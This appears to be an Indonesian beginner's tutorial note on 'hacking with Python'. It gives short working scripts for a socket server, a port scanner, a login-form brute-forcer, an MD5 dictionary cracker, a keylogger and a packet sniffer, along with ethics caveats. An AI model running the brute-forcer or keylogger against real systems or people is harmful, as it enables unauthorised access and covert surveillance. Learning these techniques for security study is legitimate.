---
tags: [hacking]
title: Hacking dengan Python
created: '2025-04-06T13:52:24.944Z'
modified: '2025-04-21T10:12:05.188Z'
---

# Hacking dengan Python

## **📌 0. Prasyarat**
Sebelum belajar hacking dengan Python, pastikan Anda sudah menguasai:
1. **Dasar Python**: Variabel, loop, fungsi, file I/O.
2. **Dasar Jaringan (Networking)**: Protokol TCP/IP, HTTP, port, DNS.
3. **Tools Penting**:
   - Python 3.x (versi terbaru).
   - Text editor (VS Code, Sublime, atau PyCharm).
   - Terminal/Command Prompt.

> ⚠️ **Catatan Etika**:  
> Hacking hanya untuk tujuan pembelajaran/pengujian keamanan **dengan izin**. Illegal hacking adalah tindakan kriminal.

---

## **📌 1. Fundamental Hacking dengan Python**
### **🔹 1.1. Socket Programming (Dasar Networking)**
Socket adalah cara Python berkomunikasi via jaringan (TCP/UDP).  
**Contoh: Membuat TCP Client-Server Sederhana**  
```python
# Server
import socket

# buat socket dengan reusable address agar port bisa dihapus secara otomatis saat tidak digunakan
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
server_socket.bind(("192.168.1.13", 8080))
server_socket.listen(1)
print("Server berjalan di port 8080...")

try:
    while True:
        conn, addr = server_socket.accept()
        print("Terhubung ke-", addr)
        conn.send(b"Hello motherfucker!")
        conn.close()
except KeyboardInterrupt:
    print("\nServer berhenti.")
finally:
    server_socket.close()

# Client
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("localhost", 8080))  # Ganti dengan IP server
print(s.recv(1024).decode())  # Output: Hello from server!
s.close()
```
**Aplikasi**: Port scanner, reverse shell, packet sniffer.

---

### **🔹 1.2. Membuat Port Scanner**
Port scanner berguna untuk menemukan port terbuka di suatu host.  
```python
import socket

target = "127.0.0.1"  # Ganti dengan target IP
ports = [21, 22, 80, 443]  # FTP, SSH, HTTP, HTTPS

for port in ports:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(1)
    result = s.connect_ex((target, port))
    if result == 0:
        print(f"Port {port} terbuka!")
    s.close()
```
**Hasil**:
```
Port 80 terbuka!
Port 443 terbuka!
```

---

### **🔹 1.3. Web Hacking (Requests & BeautifulSoup)**
Python bisa digunakan untuk **web scraping** dan **automation**.  
**Contoh: Login Form Brute-Force**  
```python
import requests

url = "http://target.com/login"
usernames = ["admin", "user"]
passwords = ["123456", "password"]

for username in usernames:
    for password in passwords:
        data = {"username": username, "password": password}
        response = requests.post(url, data=data)
        if "Login berhasil" in response.text:
            print(f"Credentials ditemukan! {username}:{password}")
            break
```
**Aplikasi**: Web scraping, SQL injection testing, CSRF exploitation.

---

## **📌 2. Proyek Mini untuk Dipraktikkan**
### **🔹 2.1. Password Cracker (Dictionary Attack)**
Mencoba memecah password dengan wordlist.  
```python
import hashlib

password_hash = "5f4dcc3b5aa765d61d8327deb882cf99"  # Hash MD5 dari "password"
wordlist = ["123456", "password", "admin", "letmein"]

for word in wordlist:
    guess = hashlib.md5(word.encode()).hexdigest()
    if guess == password_hash:
        print(f"Password ditemukan: {word}")
        break
```
**Tips**: Gunakan wordlist dari [SecLists](https://github.com/danielmiessler/SecLists).

---

### **🔹 2.2. Keylogger Sederhana**
Mencatat input keyboard (hanya untuk edukasi!).  
```python
import keyboard
import time

def on_key_press(event):
    with open("log.txt", "a") as f:
        f.write(f"{event.name}\n")

keyboard.on_press(on_key_press)
keyboard.wait()  # Tekan 'Esc' untuk berhenti
```
**⚠️ Peringatan**: Hanya gunakan di mesin Anda sendiri!

---

### **🔹 2.3. Packet Sniffer (Menggunakan Scapy)**
Analisis lalu lintas jaringan.  
```python
from scapy.all import *

def packet_callback(packet):
    if packet.haslayer(IP):
        src = packet[IP].src
        dst = packet[IP].dst
        print(f"Packet: {src} -> {dst}")

sniff(prn=packet_callback, count=10)  # Capture 10 paket
```
**Instalasi Scapy**:  
```bash
pip install scapy
```

---

## **📌 3. Sumber Belajar Lanjutan**
| Topik              | Sumber Belajar                                                                 |
|--------------------|------------------------------------------------------------------------------|
| **Python Hacking** | [Black Hat Python](https://nostarch.com/blackhatpython) (Buku)               |
| **Networking**     | [Computer Networking: A Top-Down Approach](https://gaia.cs.umass.edu/kurose_ross/) |
| **CTF & Lab**      | [TryHackMe](https://tryhackme.com/), [Hack The Box](https://www.hackthebox.com/) |

---

## **📌 4. Tips Anti-Burnout**
1. **Mulai dari proyek kecil** (jangan langsung belajar malware kompleks).  
2. **Gabung komunitas** (Discord, Reddit, forum hacking).  
3. **Istirahat setiap 1 jam**.  
4. **Catat progress** di GitHub/blog.  

---

### **🚀 Tantangan Akhir**
Buat **port scanner** yang bisa:
- Scan range port (1-1000).  
- Deteksi service (HTTP, SSH, FTP).  
- Multithreading untuk percepat scan.  

Bagi hasilnya di GitHub dan share linknya!  

🔥 **Selamat belajar!** Jika ada yang belum jelas, tanya di komentar.
